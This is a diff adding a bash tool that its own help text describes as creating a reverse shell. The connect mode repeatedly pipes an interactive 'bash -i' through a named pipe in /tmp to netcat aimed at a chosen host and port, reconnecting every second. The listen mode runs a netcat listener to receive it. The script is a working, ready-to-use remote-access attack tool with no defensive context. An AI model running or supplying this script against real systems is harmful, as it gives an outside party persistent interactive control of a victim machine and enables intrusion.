@@ -1,0 +1,124 @@
+#!/usr/bin/env bash
+
+### Helpers begin
+check_deps() {
+    local missing
+    for d in "${deps[@]}"; do
+        if [[ -z $(command -v "$d") ]]; then
+            # Force absolute path
+            if [[ ! -e "/$d" ]]; then
+                err "$d was not found"
+                missing="true"
+            fi
+        fi
+    done; unset d
+    [[ -z $missing ]] || exit 128
+}
+err() { echo -e "${color:+\e[31m}[!] $*${color:+\e[0m}" >&2; }
+errx() { err "${*:2}"; exit "$1"; }
+good() { echo -e "${color:+\e[32m}[+] $*${color:+\e[0m}"; }
+info() { echo -e "${color:+\e[37m}[*] $*${color:+\e[0m}"; }
+long_opt() {
+    local arg shift="0"
+    case "$1" in
+        "--"*"="*) arg="${1#*=}"; [[ -n $arg ]] || return 127 ;;
+        *) shift="1"; shift; [[ $# -gt 0 ]] || return 127; arg="$1" ;;
+    esac
+    echo "$arg"
+    return "$shift"
+}
+subinfo() { echo -e "${color:+\e[36m}[=] $*${color:+\e[0m}"; }
+warn() { echo -e "${color:+\e[33m}[-] $*${color:+\e[0m}"; }
+### Helpers end
+
+connect() {
+    while :; do
+        rm -f "$fifo"
+        mkfifo "$fifo"
+        # shellcheck disable=SC2094
+        bash -i 2>&1 <"$fifo" | "$nc" "$host" "$port" >"$fifo"
+        sleep 1
+    done
+    rm -f "$fifo"
+}
+
+listen() {
+    "$nc" -lvp "$port"
+}
+
+usage() {
+    cat <<EOF
+Usage: ${0##*/} [OPTIONS]
+
+DESCRIPTION
+    Create a reverse shell.
+
+OPTIONS
+    -c, --connect      Connect to a listening reverse_shell instance
+    -f, --fifo=FIFO    Use the specified fifo
+    -h, --help         Display this help message
+    --host=HOST        Use the specified host
+    -l, --listen       Listen for a connection from a connecting
+                       reverse_shell instance
+    --nc=NC            Use the specified nc binary
+    --no-color         Disable colorized output
+    -p, --port=PORT    Use the specified port
+
+EOF
+    exit "$1"
+}
+
+declare -a args
+unset help host
+color="true"
+fifo="/tmp/f"
+nc="$(command -v nc)"
+[[ -n $nc ]] || nc="$(command -v ncat)"
+[[ -n $nc ]] || nc="$(command -v netcat)"
+port="4444"
+
+# Parse command line options
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        "--") shift; args+=("$@"); break ;;
+        "-c"|"--connect") action="connect" ;;
+        "-f"|"--fifo"*) fifo="$(long_opt "$@")" ;;
+        "-h"|"--help") help="true" ;;
+        "--host"*) host="$(long_opt "$@")" ;;
+        "-l"|"--listen") action="listen" ;;
+        "--nc"*) nc="$(long_opt "$@")" ;;
+        "--no-color") unset color ;;
+        "-p"|"--port"*) port="$(long_opt "$@")" ;;
+        *) args+=("$1") ;;
+    esac
+    case "$?" in
+        0) ;;
+        1) shift ;;
+        *) usage "$?" ;;
+    esac
+    shift
+done
+[[ ${#args[@]} -eq 0 ]] || set -- "${args[@]}"
+
+# Help info
+[[ -z $help ]] || usage 0
+
+# Check for missing dependencies
+declare -a deps
+deps+=("bash")
+deps+=("mkfifo")
+check_deps
+
+# Check for valid params
+[[ $# -eq 0 ]] || usage 1
+[[ -n $action ]] || usage 1
+[[ -n $nc ]] || usage 1
+[[ -f "$nc" ]] || usage 1
+case "$action" in
+    "connect") [[ -n $host ]] || usage 1 ;;
+esac
+
+case "$action" in
+    "connect") connect ;;
+    "listen") listen ;;
+esac
